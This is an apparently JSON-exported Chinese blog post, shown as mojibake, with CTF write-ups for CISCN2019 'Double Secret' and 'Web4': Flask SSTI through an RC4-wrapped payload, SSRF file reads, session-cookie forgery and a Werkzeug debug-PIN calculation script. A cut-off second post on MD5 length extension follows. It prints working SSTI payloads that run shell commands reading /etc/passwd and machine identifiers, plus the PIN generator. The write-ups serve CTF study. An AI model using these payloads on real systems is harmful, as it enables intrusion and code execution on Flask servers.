æˆ‘ä»¬æƒ³åŠæ³•è¯»åˆ°å“åº”çš„å…³é”®ä¿¡æ¯è®¡ç®—PINç å³å¯ æˆ‘ä»¬å›é¡¾ä¸€ä¸‹éœ€è¦è¯»å–çš„å†…å®¹ 1. è¿è¡Œå½“å‰ç¨‹åºçš„ç”¨æˆ·åï¼Œå¯ä»¥é€šè¿‡/etc/passwdå°è¯• 2. å¯¹è±¡appçš„__module__å±æ€§ï¼Œæ²¡æœ‰åˆ™ä»ç±»ä¸­å–ï¼Œé»˜è®¤ä¸ºflask.app 3. å¯¹è±¡appçš„__name__å±æ€§ï¼Œæ²¡æœ‰åˆ™ä»ç±»ä¸­å–ï¼Œé»˜è®¤ä¸ºFlask 4. flaskåŒ…ä¸­çš„appæ–‡ä»¶ç»å¯¹è·¯å¾„ï¼Œpython2ä¸ºpycï¼Œé»˜è®¤ä¸º/usr/local/lib/python{ç‰ˆæœ¬å·}/site-packages/flask/app.py 5. Macåœ°å€çš„æ•´å‹ 6. æœºå™¨ID docker /proc/self/cgroupï¼Œæ­£åˆ™åˆ†å‰² Linux /etc/machine-idï¼Œ/proc/sys/kernl/random/boot_idï¼Œå‰è€…å›ºå®šåè€…ä¸å›ºå®š macOS ioreg -c IOPlatformExpertDevice -d 2ä¸­\"serial-number\" = &lt;{ID}éƒ¨åˆ† Windows æ³¨å†Œè¡¨HKEY_LOCAL_MACHINE-&gt;SOFTWARE-&gt;Microsoft-&gt;Cryptography-&gt;MachineGuid è¿™é‡Œæˆ‘ä»¬æ ¹æ®æŠ¥é”™ï¼Œçœ‹ä¸€ä¸‹appç›®å½•ä¸‹çš„ä¿¡æ¯ if(secret==None): return 'Tell me your secret.I will encrypt it so others can\\'t see' rc=rc4_Modified.RC4(\"HereIsTreasure\") #è§£å¯† deS=rc.do_crypt(secret) a=render_template_string(safe(deS)) if 'ciscn' in a.lower(): return 'flag detected!' return a å‘ç°è¿™é‡Œå°†æˆ‘ä»¬ä¼ å…¥çš„secretè¿›è¡Œäº†rc4åŠ å¯†ï¼Œéšåè¿›è¡Œäº†æ¨¡æ¿æ³¨å…¥ï¼Œè¿™é‡Œä¼°è®¡æ˜¯æœ‰sstiæ¼æ´çš„ï¼Œéšåè¿‡æ»¤äº†ciscnè¿™ä¸ªå…³é”®è¯ æ–¹æ³•ä¸€ï¼šSSTIæ³¨å…¥ è¿™é‡Œè‚¯å®šå¾—çŸ¥é“åŠ å¯†çš„è„šæœ¬ï¼Œè¿™æ ·æˆ‘ä»¬åˆ©ç”¨è¯¥è„šæœ¬æ³¨å…¥æˆ‘ä»¬çš„æ¶æ„ä»£ç æ‰ä¼šæˆåŠŸæ‰§è¡Œã€‚è¿™é‡Œä¹Ÿæ˜¯çœ‹äº†wpæ‰å¾—åˆ°çš„RC4åŠ å¯†è„šæœ¬ import base64 from urllib.parse import quote def rc4_main(key = \"init_key\", message = \"init_message\"): # print(\"RC4åŠ å¯†ä¸»å‡½æ•°\") s_box = rc4_init_sbox(key) crypt = str(rc4_excrypt(message, s_box)) return crypt def rc4_init_sbox(key): s_box = list(range(256)) # æˆ‘è¿™é‡Œæ²¡ç®¡ç§˜é’¥å°äº256çš„æƒ…å†µï¼Œå°äº256ä¸æ–­é‡å¤å¡«å……å³å¯ # print(\"åŸæ¥çš„ s ç›’ï¼š%s\" % s_box) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] # print(\"æ··ä¹±åçš„ s ç›’ï¼š%s\"% s_box) return s_box def rc4_excrypt(plain, box): # print(\"è°ƒç”¨åŠ å¯†ç¨‹åºæˆåŠŸã€‚\") res = [] i = j = 0 for s in plain: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(ord(s) ^ k)) # print(\"resç”¨äºåŠ å¯†å­—ç¬¦ä¸²ï¼ŒåŠ å¯†åæ˜¯ï¼š%res\" %res) cipher = \"\".join(res) print(\"åŠ å¯†åçš„å­—ç¬¦ä¸²æ˜¯ï¼š%s\" %quote(cipher)) #print(\"åŠ å¯†åçš„è¾“å‡º(ç»è¿‡ç¼–ç ):\") #print(str(base64.b64encode(cipher.encode('utf-8')), 'utf-8')) return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8')) #éœ€è¦åŠ å¯†çš„å­—ç¬¦ä¸²åœ¨è¿™é‡Œä¿®æ”¹ rc4_main(\"HereIsTreasure\",\"{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}\") è¿™é‡Œæœ‰ä½¬è¯´æ˜ï¼šè¿™é‡Œæ˜¯åç«¯å¯¹secretä¼ å…¥çš„å€¼è¿›è¡Œäº†RC4åŠ å¯†ï¼ŒRC4åŠ å¯†æ–¹å¼ä¸ºï¼Œæ˜æ–‡åŠ å¯†ä¸€æ¬¡å¾—åˆ°å¯†æ–‡ï¼Œå¯†æ–‡åœ¨åŠ å¯†ä¸€æ¬¡å¾—åˆ°æ˜æ–‡ã€‚æ‰€ä»¥è¦ä½¿ç”¨RC4è„šæœ¬å¯¹æˆ‘ä»¬ä¼ å…¥çš„æ¶æ„å­—ç¬¦ä¸²è¿›è¡Œä¸€æ¬¡åŠ å¯†ï¼Œè¿™æ ·ä¼ ç»™ç³»ç»Ÿï¼Œæ—¢ç»•è¿‡æ£€æµ‹ï¼ŒåŒæ—¶è¿˜å¾—åˆ°äº†æ˜æ–‡å¾—ä»¥æ‰§è¡Œ ä¸è¿‡è¿™é“é¢˜ä¼¼ä¹ç›´æ¥ç”¨ä¸Šè¿°çš„sstiç›´æ¥è¯»å–flagå³å¯ï¼Œä½†æˆ‘ä»¬æ˜¯æ¥ç»ƒä¹ PINç è·å–çš„ï¼Œé‚£æˆ‘ä»¬é‡‡ç”¨å¦å¤–çš„æ€è·¯ï¼Œä¸è¿‡è¿™é‡Œå…ˆèµ°ä¸€éssti è°ƒç”¨ï¼š rc4_main(\"HereIsTreasure\",\"{{''.__class__.__mro__[2].__subclasses__()}}\") ä¸‹æ ‡ä¸º59çš„æ˜¯warnings.catch_warningsï¼Œç›´æ¥åˆ©ç”¨å³å¯ï¼š rc4_main(\"HereIsTreasure\",\"{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}\") æ‹¿åˆ°flag æ–¹æ³•äºŒï¼šPINç è®¡ç®— æœ‰äº†æ–¹æ³•ä¸€çš„æ€è·¯æˆ‘ä»¬ç›´æ¥ç…§ç€è¯»å–å³å¯ 1. è¿è¡Œå½“å‰ç¨‹åºçš„ç”¨æˆ·åï¼Œå¯ä»¥é€šè¿‡/etc/passwdå°è¯• 2. å¯¹è±¡appçš„__module__å±æ€§ï¼Œæ²¡æœ‰åˆ™ä»ç±»ä¸­å–ï¼Œé»˜è®¤ä¸ºflask.app 3. å¯¹è±¡appçš„__name__å±æ€§ï¼Œæ²¡æœ‰åˆ™ä»ç±»ä¸­å–ï¼Œé»˜è®¤ä¸ºFlask 4. flaskåŒ…ä¸­çš„appæ–‡ä»¶ç»å¯¹è·¯å¾„ï¼Œpython2ä¸ºpycï¼Œé»˜è®¤ä¸º/usr/local/lib/python{ç‰ˆæœ¬å·}/site-packages/flask/app.py 5. Macåœ°å€çš„æ•´å‹ 6. æœºå™¨ID docker /proc/self/cgroupï¼Œæ­£åˆ™åˆ†å‰² Linux /etc/machine-idï¼Œ/proc/sys/kernel/random/boot_idï¼Œå‰è€…å›ºå®šåè€…ä¸å›ºå®š macOS ioreg -c IOPlatformExpertDevice -d 2ä¸­\"serial-number\" = &lt;{ID}éƒ¨åˆ† Windows æ³¨å†Œè¡¨HKEY_LOCAL_MACHINE-&gt;SOFTWARE-&gt;Microsoft-&gt;Cryptography-&gt;MachineGuid å…ˆè¯»å–/etc/passwd rc4_main(\"HereIsTreasure\",\"{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}}\") è¿™é‡ŒçŒœæµ‹æ˜¯rootç”¨æˆ·ï¼Œä½†ç”±äºä¸ç¡®å®šè¿˜æ˜¯å†³å®šçœ‹çœ‹wpå‘ç°ä»–è®¤ä¸ºusername ä¸º glzjinã€‚ã€‚ã€‚ã€‚ä¸å¤ªæ‡‚ï¼Œå…ˆå¾€ä¸‹åšçœ‹çœ‹ flaskåŒ…ä¸­çš„appæ–‡ä»¶ç»å¯¹è·¯å¾„ getattr(mod, '__file__', None) ä»æŠ¥é”™é¡µé¢å¾—çŸ¥ä¸º /usr/local/lib/python2.7/site-packages/flask/app.pyc Macåœ°å€ rc4_main(\"HereIsTreasure\",\"{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('cat /sys/class/net/eth0/address').read()}}\") è½¬æ¢ä¸ºåè¿›åˆ¶æ•°ä¸ºï¼š244583227313717 è¯»å–get_machine_id() å¯¹å¦‚ä¸‹å­—ç¬¦ä¸²è¿›è¡Œ RC4 åŠ å¯†ï¼Œå†ä¼ å…¥ secret ä¸­ rc4_main(\"HereIsTreasure\",\"{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('cat /proc/self/cgroup').read()}}\") æ ¹æ®è¯»å–è§„åˆ™æˆ‘ä»¬ä»ç®­å¤´å¤„å¼€å§‹è¯»å– docker-11a33fd98fd85e6543a295bd7e77f5f0a222196211955341ed11298c93ba8db0.scope æœ€åå¾—åˆ°äº†ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¸Šè¿°çš„ä¿¡æ¯ä¹Ÿå¯ä»¥å‘ç°ä»–æ˜¯dockerå¯åŠ¨çš„æœåŠ¡ï¼Œæ ¹æ®è§„åˆ™æˆ‘ä»¬åªéœ€è¦è¯»å–ä¸Šé¢çš„ä¿¡æ¯ä»¥åŠ/proc/self/cgroupè·¯å¾„ä¸‹çš„ä¿¡æ¯ï¼Œè¿™é‡Œå‰©ä¸‹çš„æœ€åä¸€ä¸ªè·¯å¾„æ˜¯ç©ºçš„ï¼Œå¤§å®¶å¯ä»¥å°è¯• è¿™é‡Œçœ‹çš„é‚£ç¯‡æ–‡ç« ä¸å¤Ÿç»†èŠ‚ï¼Œå‘äº†æˆ‘ä¸€æ‰‹ï¼Œè¿™é‡Œæˆ‘ä»¬åœ¨è¯»å–ç¬¬ä¸€ä¸ªè·¯å¾„/proc/self/cgroupçš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯¹äºç»“æœåªå–ç¬¬ä¸€è¡Œï¼Œä¸” å°†ç¬¬ä¸€è¡Œçš„æ•°æ®ï¼š 'class' is not allowed. Secret is 12:hugetlb:/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podf1fac0b3_f07f_4e83_ad38_8d4d9f5bb2f5.slice/docker- ä½¿ç”¨å¦‚ä¸‹æ­£åˆ™è¿›è¡ŒåŒ¹é…æœ€ç»ˆç»“æœï¼š print(value.strip().partition(\"/docker/\")[2]) valueæ˜¯æˆ‘ä»¬çš„åŸå§‹æ•°æ®ï¼Œæœ€åçš„ç»“æœå¦‚ä¸‹ï¼Œæ˜¯ç©ºçš„ é‚£æˆ‘ä»¬éœ€è¦è¯»å–/proc/sys/kernel/random/boot_idè·¯å¾„ä¸‹çš„å†…å®¹ æœ€åå¾—åˆ°çš„6ä¸ªå˜é‡çš„å€¼åˆ†åˆ«ä¸º username å€¼ä¸º glzjin modname å€¼ä¸º flask.app getattr(app, '__name__', getattr(app.__class__, '__name__')) å€¼ä¸º Flask getattr(mod, '__file__', None)å€¼ä¸º/usr/local/lib/python2.7/site-packages/flask/app.pyc str(uuid.getnode()) å€¼ä¸º244583227313717 get_machine_id() å€¼ä¸º8cab9c97-85be-4fb4-9d17-29335d7b2b8a ç”¨å¦‚ä¸‹è„šæœ¬ç”Ÿæˆ PIN #MD5 import hashlib from itertools import chain probably_public_bits = [ 'glzjin'# username 'flask.app',# modname 'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python2.7/site-packages/flask/app.pyc' # getattr(mod, '__file__', None), ] private_bits = [ '244583227313717',# str(uuid.getnode()), /sys/class/net/eth0/address '8cab9c97-85be-4fb4-9d17-29335d7b2b8a'# get_machine_id(), /etc/machine-id ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num print(rv) è‡³äºé‚£ä¸ªç”¨æˆ·æ˜¯glzjinä¸å¤ªæ¸…æ¥šï¼Œä¼°è®¡æ˜¯ä»–ä»¬è¯•å‡ºæ¥çš„å§ æœ€åå°†å¾—åˆ°çš„PINè¾“å…¥å³å¯è¿›è¡Œå‘½ä»¤è¡Œäº¤äº’æ¨¡å¼ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥è®¿é—®consoleè·¯ç”±è¾“å…¥PINç ï¼Œå¦‚ä¸‹å›¾æˆåŠŸå¾—åˆ°flag [CISCN2019 åä¸œå—èµ›åŒº]Web4 è¿™é“é¢˜å‰æœŸä¾æ—§æ˜¯æ²¡æ€è·¯ï¼Œåˆ·é¢˜å¤ªå°‘ï¼Œè¿˜æ˜¯æ³¨é‡PINç çš„ç»ƒä¹ å§ è®¿é—®ä¹‹åå‘ç°æœ‰ä¸ªè¶…é“¾æ¥ï¼Œç‚¹å‡»åå‘ç°è·³è½¬åˆ°äº†ç™¾åº¦é¡µé¢ï¼Œemmmé‚£å°±æ˜¯ssrfè¯»å–æ•æ„Ÿä¿¡æ¯äº†å‘— è¿™é‡Œæˆ‘å°è¯•äº†fileè¯»å–/etc/passwdä½†è¢«banäº†ï¼Œäºæ˜¯æ²¡æ€è·¯äº†ï¼Œçœ‹äº†wpå‘ç°ä»–æœ‰çš„ç›´æ¥?url=/etc/passwdç›´æ¥å°±è¯»åˆ°äº†ã€‚ã€‚ã€‚éšåæˆ‘åˆå°è¯•ï¼š url=../app/app.py ç›´æ¥è¯»åˆ°äº†æºç ï¼Œä¸è¿‡è¿™é‡Œçœ‹æœ‰çš„å¸ˆå‚…é‡‡ç”¨å¦ä¸€ä¸ªå§¿åŠ¿local_file:///è¯»å–æ–‡ä»¶ï¼ˆæ²¡å­¦è¿‡ï¼Œä»¥åæœ‰ç¼˜çœ‹çœ‹ï¼‰ #encoding: utf - 8 import re, random, uuid, urllib from flask import Flask, session, request app = Flask(__name__) random.seed(uuid.getnode()) app.config['SECRET_KEY'] = str(random.random() * 233) app.debug = True @app.route('/') def index(): session['username'] = 'www-data' return 'Hello World! Read somethings'@ @app.route('/read') def read(): try: url = request.args.get('url') m = re.findall('^file.*', url, re.IGNORECASE) n = re.findall('flag', url, re.IGNORECASE) if m or n: return 'No Hack' res = urllib.urlopen(url) return res.read() except Exception as ex: print str(ex) return 'no response'@ @app.route('/flag') def flag(): if session and session['username'] == 'fuck': return open('/flag.txt').read() else : return 'Access denied' if __name__ == '__main__': app.run(debug = True, host = \"0.0.0.0\") å®¡è®¡ä¸€æ³¢å‘ç°åœ¨readè·¯ç”±ä¸‹ï¼Œå¯ä»¥è¿›è¡Œæ–‡ä»¶è¯»å–ï¼Œä½†æ˜¯ä¸èƒ½å«æœ‰fileä¸flagçš„å…³é”®å­—ã€‚ åœ¨flagè·¯ç”±ä¸‹ï¼Œå¦‚æœsessionå˜é‡å­˜åœ¨ï¼Œä¸”å…¶ä¸­é”®åä¸ºusernameçš„å€¼ä¸ºfuckï¼Œåˆ™æˆåŠŸè¯»å–åˆ°flagï¼Œé‚£å°±æ˜¯è¦ä¼ªé€ sessionäº†ï¼Œä¸è¿‡åœ¨æ­¤ä¹‹å‰è¿˜éœ€è¦çŸ¥é“å¯†é’¥ï¼Œä¸‹é¢çœ‹ä¸€ä¸‹å¯†é’¥ç”Ÿæˆæ–¹å¼ random.seed(uuid.getnode()) app.config['SECRET_KEY'] = str(random.random() * 233) è¿™é‡Œæˆ‘åªæ˜¯æ¸…æ¥šä»–é‡‡ç”¨çš„uuid.getnodeå³Macåœ°å€ä½œä¸ºseedç§å­ï¼Œå€Ÿç”¨ä¸€ä¸‹å…¶ä»–å¸ˆå‚…çš„è®²è¿°ï¼š å¯¹äºä¼ªéšæœºæ•°ï¼Œå¦‚æœseedæ˜¯å›ºå®šçš„ï¼Œç”Ÿæˆçš„éšæœºæ•°æ˜¯å¯ä»¥é¢„æµ‹çš„ï¼Œä¹Ÿå°±æ˜¯é¡ºåºå›ºå®šçš„ï¼Œæ‰€ä»¥åªè¦çŸ¥é“seedçš„å€¼å³å¯ã€‚è¿™é‡Œçš„seedä½¿ç”¨çš„uuid.getnode()çš„å€¼ï¼Œè¯¥å‡½æ•°ç”¨äºè·å–Macåœ°å€å¹¶å°†å…¶è½¬æ¢ä¸ºæ•´æ•°ã€‚ é‚£æˆ‘ä»¬è¯»å–ä¸€ä¸‹Macåœ°å€çœ‹çœ‹?url=../sys/class/net/eth0/address è½¬ä¸ºåè¿›åˆ¶æ•°ä¸ºï¼š165897528343673ï¼Œè¿™é‡Œçœ‹äº†ä¼¼ä¹ä¾æ—§æ˜¯ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯å¸¸è§„çš„sessionä¼ªé€ ï¼Œå¦ä¸€ç§å°±æ˜¯PINç è®¡ç®—ï¼Œè¿›è¡Œå‘½ä»¤äº¤äº’ æ–¹æ³•ä¸€ï¼šsessionä¼ªé€  ä¸è¿‡æ¥ä¸‹æ¥çš„å‡ æ­¥è€ç–‘æƒ‘äº†ï¼Œæˆ‘çœ‹æœ‰çš„å¸ˆå‚…æ˜¯æŠ¥é”™çœ‹å‡ºæ¥çš„pythonç‰ˆæœ¬ä¸º2.7ï¼Œä½†ä¹Ÿä¸çŸ¥é“å¦‚ä½•çˆ†å‡ºæ¥çš„ï¼Œè¿™é‡Œæˆ‘åšå®Œåœ¨ç ”ç©¶ ä½¿ç”¨Python2å¾—å‡ºå¯†é’¥ï¼ˆPython2å’ŒPython3ä¿ç•™çš„ä½æ•°ä¸ä¸€æ ·ï¼‰ import random random.seed(0x96e2073efc79) print(str(random.random()*233)) å¾—åˆ°12.221805183 æ¥ä¸‹æ¥ç”¨å·¥å…·è¿›è¡Œsessionä¼ªé€  python3 flask_session_cookie_manager3.py decode -c \"eyJ1c2VybmFtZSI6eyIgYiI 6ImQzZDNMV1JoZEdFPSJ9fQ.ZVH0fg.JlHfWUlenH8zN6oP-IQM4l76BjA\" -s \"12.221805183\" å¦‚å›¾æˆåŠŸè§£å¯†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯åŠ å¯†äº† python3 flask_session_cookie_manager3.py encode -s \"12.221805183\" -t \"{'username': 'fuck'}\" å¦‚ä¸‹å›¾ï¼Œä¿®æ”¹sessionåè®¿é—®flagå³å¯å¾—åˆ° æ–¹æ³•äºŒï¼šPINç è®¡ç®— ç”±äºæˆ‘ä»¬åœ¨ä¸Šé¢ä»£ç ä¸­å¯ä»¥çœ‹åˆ°å…¶debugå¼€å¯äº†ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é‡‡ç”¨PINç è®¡ç®—çš„æ–¹å¼æ¥è·å–flag å¦‚å›¾è¿˜æ˜¯glzjinç”¨æˆ· appè·¯å¾„ä¸ºï¼š/usr/local/lib/python2.7/site-packages/flask/app.pyâ€“ä¸è¿‡æ­¤å¤„æˆ‘è®¤ä¸ºåªèƒ½çŒœï¼Œå› ä¸ºæ ¹æ®ä¸Šè¿°ä»£ç çš„ç¼–å†™ï¼Œæˆ‘å¹¶ä¸æ¸…æ¥šå¦‚ä½•ä½¿å…¶æŠ¥é”™ï¼Œåªèƒ½å½“ä½ è·¯å¾„è®¿é—®æ­£ç¡®æ‰å¯ä»¥ï¼Œä¸è¿‡è¿™é‡Œåªéœ€è¦æ›´æ”¹2.7å³å¯ è¿™é‡ŒMacåœ°å€æˆ‘ä»¬å·²ç»å¾—åˆ°ï¼š165897528343673 è¯»å–get_machine_id() è€è§„çŸ©å–ç¬¬ä¸€è¡Œæ•°æ® ä¾æ—§ä¸ºç©ºï¼Œé‚£åªéœ€è¦è¯»å–/proc/sys/kernel/random/boot_id ä¸Šè„šæœ¬è®¡ç®— #MD5 import hashlib from itertools import chain probably_public_bits = [ 'glzjin'# username 'flask.app',# modname 'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python2.7/site-packages/flask/app.pyc' # getattr(mod, '__file__', None), ] private_bits = [ '165897528343673',# str(uuid.getnode()), /sys/class/net/ens33/address '8cab9c97-85be-4fb4-9d17-29335d7b2b8a'# get_machine_id(), /etc/machine-id ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num print(rv) #print(value.strip().partition(\"/docker/\")[2]) å¾—åˆ°PINç åè®¿é—®consoleè·¯ç”±è¾“å…¥PINç å³å¯ï¼Œå¦‚ä¸‹å›¾å¾—åˆ°flag 0x05 å‚è€ƒæ–‡ç«  Flask debugæ¨¡å¼ç®—pinç -çˆ±ä»£ç çˆ±ç¼–ç¨‹ Flask Pinç æ„é€ è¯¦è§£ æ·±å…¥æµ…å‡ºFlask PIN Flask debugæ¨¡å¼ä¸‹çš„ PIN ç å®‰å…¨æ€§ [CISCN2019 åä¸œå—èµ›åŒº]Double Secret BUUCTFï¼š[CISCN2019 åä¸œå—èµ›åŒº]Web4 åˆ·é¢˜[CISCN2019 åä¸œå—èµ›åŒº]Web4 å…³äºctfä¸­flaskç®—pinæ€»ç»“","tags":["åŸºæœ¬çŸ¥è¯†"],"categories":["webçŸ¥è¯†æ€»ç»“"]},{"title":"æµ…æmd5æ‹“å±•æ”»å‡»","path":"/2023/11/12/qian-xi-md5-tuo-zhan-gong-ji/","content":"0x01 å‰è¨€ æœ€è¿‘åˆ·CTFé¢˜ç›®çš„æ—¶å€™é‡åˆ°äº†md5æ‹“å±•æ”»å‡»çš„çŸ¥è¯†ç‚¹ï¼Œç”±äºä¸å¤ªæ¸…æ¥šåŸç†ï¼Œæ•…æ­¤æ¥å­¦ä¹ ä¸€ç•ª 0x02 md5åŠ å¯†ç®—æ³• 2.1 åŠ å¯†åŸç† ä¸ºäº†æ›´å¥½åœ°ç†è§£æ”¹æ”»å‡»ï¼Œé¦–å…ˆäº†è§£ä¸€ä¸‹MD5çš„åŠ å¯†ç®—æ³•ï¼ŒåŠ å¯†è¿‡ç¨‹çš„ç¤ºæ„å›¾å¦‚ä¸‹ï¼š å›¾æœ‰ç‚¹æŠ½è±¡å•Šï¼Œè¿˜æ˜¯çœ‹ä½¬ä»¬çš„è§£é‡Šå§ï¼š é€šä¿—æ¥è®²ï¼Œå°±æ˜¯MD5æŠŠæ¯512ä½å½“ä½œä¸€ç»„è¿›è¡ŒåŠ å¯†è®¡ç®—ï¼Œé¦–å…ˆæœ‰ä¸€ä¸ªåˆå§‹åºåˆ—çš„å€¼ï¼ˆè¯¥å€¼æ˜¯å›ºå®šçš„ï¼‰ï¼Œè¿™ä¸ªåˆå§‹åºåˆ—ä¸ä¿¡æ¯çš„ç¬¬ä¸€ç»„512ä½è¿›è¡Œè¿ç®—ï¼Œå¾—åˆ°ä¸€ä¸ªç»“æœï¼Œè¯¥ç»“æœä½œä¸ºä¸‹ä¸€ç»„512ä½çš„åˆå§‹åºåˆ—ï¼Œå†è¿›è¡ŒåŒæ ·çš„è¿ç®—ï¼Œä¾æ­¤ç±»æ¨ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæœ€åä¸€ä¸ªåˆ†ç»„çš„å64ä½ç”¨æ¥æ˜¾ç¤ºåŸæ¶ˆæ¯çš„æ€»é•¿ï¼Œæ˜¯é¢„ç•™çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæœ€åä¸€ä¸ªåˆ†ç»„åªèƒ½æœ‰448ä½ã€‚ æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼Œå¦‚æœè¦æ˜¯ï¼ˆåŠ å¯†çš„ä¿¡æ¯é•¿åº¦+64ï¼‰å¹¶ä¸æ˜¯512çš„æ•´æ•°å€æ€ä¹ˆåŠå‘¢ï¼Ÿ MD5çš„ç­–ç•¥æ˜¯ï¼š æœ€åä¸€ä¸ªåˆ†ç»„å¦‚æœä¸è¶³512ï¼Œåˆ™è¿›è¡Œå¡«å……ï¼Œå¡«å……çš„ç­–ç•¥æ˜¯ï¼šåœ¨åŸæ¶ˆæ¯å’ŒåŸæ¶ˆæ¯æ€»é•¿ä¹‹é—´å¡«å……01å­—ç¬¦ä¸²ï¼Œç¬¬ä¸€ä½ä¸º1ï¼Œå‰©ä¸‹çš„å…¨éƒ¨å¡«å……0ã€‚ è¿™æ ·å…¶å®å°±æœ‰äº†ä¸€ä¸ªæ¼æ´ï¼š å¦‚æœç»™å‡ºä¸€ä¸ªmessageå’Œè¯¥messageç»è¿‡md5åŠ å¯†åçš„å€¼ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰‹åŠ¨å¡«å……ï¼ŒæŠŠæ¶ˆæ¯é•¿åº¦å¡«å……åˆ°512çš„æ•´æ•°å€ï¼Œå†æ ¹æ®è¿™ä¸ªæ–°çš„å­—ç¬¦ä¸²ï¼Œè‡ªå·±è®¡ç®—å‡ºmd5å€¼ï¼ˆå› ä¸ºæœ‰åŸmessageçš„md5å€¼ï¼Œç›¸å½“äºçŸ¥é“äº†åŠ å¯†çš„åˆå§‹åºåˆ—ï¼‰ï¼ŒåŒæ ·å¯ä»¥æˆåŠŸã€‚ 2.2 å¡«å……è¿‡ç¨‹ç®€è¦è¯´æ˜ æ¯”å¦‚åŸä¿¡æ¯ä¸ºtestï¼Œmd5(â€˜testâ€™) = 098f6bcd4621d373cade4e832627b4f6ï¼›ä¹Ÿå°±æ˜¯è¯´åŸä¿¡æ¯åªæœ‰4*8=32ä½ï¼Œæˆ‘ä»¬è¦å¡«å……448 - 32 = 416ä½ã€‚ â€˜testâ€™çš„åå…­è¿›åˆ¶æ˜¯0x74673574ï¼ˆåå…­è¿›åˆ¶æ¯ä¸ªå­—ç¬¦å¯ä»¥è½¬æˆ4ä¸ªäºŒè¿›åˆ¶ä½ï¼‰ï¼Œæ ¹æ®æˆ‘ä»¬ä¸Šæ–‡æåˆ°çš„ç­–ç•¥ï¼Œå¡«å……ååº”è¯¥æ˜¯ï¼š80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000 æ³¨æ„ï¼šMD5ä¸­çš„å¡«å……éƒ½æ˜¯å°ç«¯åºï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ•°æ®çš„é«˜ä½å­—èŠ‚å­˜æ”¾åœ¨åœ°å€çš„é«˜ç«¯ ä½ä½å­—èŠ‚å­˜æ”¾åœ¨åœ°å€ä½ç«¯ï¼Œæ¯”å¦‚åå…­è¿›åˆ¶çš„å16ä½ï¼ˆ64/4ï¼‰æ˜¯32ï¼Œè¡¨ç¤ºä¿¡æ¯é•¿åº¦æ˜¯32ä½ï¼Œå°±æ˜¯2000000000000000ï¼› å¦‚æœæˆ‘ä»¬æƒ³è¦æ·»åŠ å­—ç¬¦ä¸²ï¼ˆæ¯”å¦‚æ·»åŠ wnï¼‰ï¼Œå°±å¯ä»¥åˆ©ç”¨â€˜testâ€™å·²ç»ç®—å‡ºæ¥çš„md5ç»“æœï¼Œå½“ä½œ â€˜wnâ€™ å­—ç¬¦ä¸²åŠ å¯†è¿ç®—çš„åˆå§‹åŒ–åºåˆ—ï¼Œç»§ç»­å¡«å……çš„è¿‡ç¨‹ï¼Œç®—å‡ºæ¥çš„ç»“æœå°±æ˜¯ â€˜testwnâ€™ å­—ç¬¦ä¸²åŠ å¯†çš„ç»“æœã€‚ 0x03 md5åŠ å¯†å†ç†è§£ ç»è¿‡ä¸Šè¿°çš„è§£é‡Šæˆ‘è¿˜æ˜¯æœ‰ç‚¹ä¸ç†è§£ï¼Œé‚£æˆ‘ä»¬åœ¨æ‰¾ç‚¹å…¶ä»–æ–‡ç« æ¥åˆ†æ 3.1 é¢˜ç›®æ ·ä¾‹ åœ¨ä¸€é“webé¢˜ç›®ä¸­é‡åˆ°äº†ä»¥ä¸‹åˆ¤æ–­: if ($COOKIE[\"md5hash\"] === md5($secret . $input)) åœ¨è¯¥é¢˜ç›®ä¸­æˆ‘ä»¬å¯ä»¥æŒæ¡çš„å‚æ•°æœ‰md5hashã€inputçš„å€¼ï¼Œsecretçš„md5å€¼å’Œé•¿åº¦ï¼Œæˆ‘ä»¬éœ€è¦æƒ³åŠæ³•è®©è¿™ä¸ªåˆ¤æ–­é€šè¿‡ã€‚ ç”±æ­¤æƒ³åˆ°äº†md5çš„hashé•¿åº¦æ‰©å±•æ”»å‡»ã€‚ 3.2 md5ç®—æ³•åŸç† 3.2.1 åŸºæœ¬ä»‹ç» 